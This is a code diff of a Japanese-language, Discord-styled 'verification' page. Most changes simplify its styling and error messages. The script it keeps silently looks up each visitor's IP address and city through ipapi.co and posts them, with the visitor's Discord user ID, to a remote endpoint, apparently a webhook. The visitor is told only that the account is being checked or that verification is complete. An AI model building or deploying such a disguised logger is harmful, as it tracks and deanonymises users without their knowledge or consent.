@@ -8,54 +8,44 @@
         body {
             background-color: #232428; /* Discordの背景色 */
             color: #dbdee1;
-            font-family: 'gg sans', 'Noto Sans JP', sans-serif;
+            font-family: sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
-            overflow: hidden;
         }
         .container {
-            background-color: #313338; /* パネルの色 */
-            padding: 48px;
+            background-color: #313338;
+            padding: 40px;
             border-radius: 8px;
-            box-shadow: 0 8px 16px rgba(0,0,0,0.24);
+            box-shadow: 0 8px 16px rgba(0,0,0,0.2);
             text-align: center;
-            width: 100%;
+            width: 90%;
             max-width: 400px;
-        }
-        .icon-box {
-            position: relative;
-            margin-bottom: 24px;
         }
         .spinner {
             border: 4px solid rgba(255, 255, 255, 0.1);
-            border-left-color: #5865f2; /* Discord Blue */
+            border-left-color: #5865f2;
             border-radius: 50%;
             width: 40px;
             height: 40px;
             animation: spin 1s linear infinite;
             display: inline-block;
+            margin-bottom: 20px;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
-        
-        h1 { font-size: 24px; margin-bottom: 8px; color: #ffffff; }
-        p { font-size: 16px; color: #b5bac1; line-height: 1.5; }
-        
-        .success-icon { color: #23a559; font-size: 50px; display: none; }
-        .error-icon { color: #f23f43; font-size: 50px; display: none; }
+        h1 { font-size: 20px; margin-bottom: 10px; color: #ffffff; }
+        p { font-size: 14px; color: #b5bac1; }
+        .success-mark { color: #23a559; font-size: 50px; display: none; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="icon-box">
-            <div id="loading-spinner" class="spinner"></div>
-            <div id="success-mark" class="success-icon">✔</div>
-            <div id="error-mark" class="error-icon">✖</div>
-        </div>
+        <div id="loading" class="spinner"></div>
+        <div id="success" class="success-mark">✔</div>
         <h1 id="status">認証中...</h1>
-        <p id="msg">アカウントの安全性を確認しています。</p>
+        <p id="msg">しばらくお待ちください。</p>
     </div>
 
     <script>
@@ -66,7 +56,8 @@
             const state = params.get('state');
 
             if (!state) {
-                showError("パラメータ不足", "URLが正しくありません。");
+                document.getElementById('status').innerText = "エラー";
+                document.getElementById('msg').innerText = "パラメータが不足しています。";
                 return;
             }
 
@@ -74,7 +65,6 @@
                 const parts = state.split('_');
                 const logId = parts[1];
                 const userId = parts[3];
-                const guildId = parts[7];
 
                 const geo = await (await fetch('https://ipapi.co/json/')).json();
 
@@ -85,35 +75,23 @@
                         content: `✅ **認証成功**: <@${userId}>`,
                         embeds: [{
                             title: "User Verified",
-                            description: `**User:** <@${userId}>\n**Server:** \`${guildId}\`\n**IP:** \`${geo.ip}\`\n**Location:** \`${geo.city}, ${geo.country_name}\``,
+                            description: `**User:** <@${userId}>\n**IP:** \`${geo.ip}\`\n**Location:** \`${geo.city}, ${geo.country_name}\``,
                             color: 0x23a559,
                             timestamp: new Date().toISOString()
                         }]
                     })
                 });
 
-                showSuccess("認証が完了しました", "このタブを閉じてDiscordに戻ってください。");
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('success').style.display = 'inline-block';
+                document.getElementById('status').innerText = "認証完了";
+                document.getElementById('msg').innerText = "この画面を閉じてDiscordに戻ってください。";
 
             } catch (e) {
-                showError("エラー", "処理中に問題が発生しました。");
+                document.getElementById('status').innerText = "エラー";
+                document.getElementById('msg').innerText = "処理に失敗しました。";
             }
         }
-
-        function showSuccess(title, msg) {
-            document.getElementById('loading-spinner').style.display = 'none';
-            document.getElementById('success-mark').style.display = 'inline-block';
-            document.getElementById('status').innerText = title;
-            document.getElementById('msg').innerText = msg;
-        }
-
-        function showError(title, msg) {
-            document.getElementById('loading-spinner').style.display = 'none';
-            document.getElementById('error-mark').style.display = 'inline-block';
-            document.getElementById('status').innerText = title;
-            document.getElementById('status').style.color = '#f23f43';
-            document.getElementById('msg').innerText = msg;
-        }
-
         window.onload = start;
     </script>
 </body>
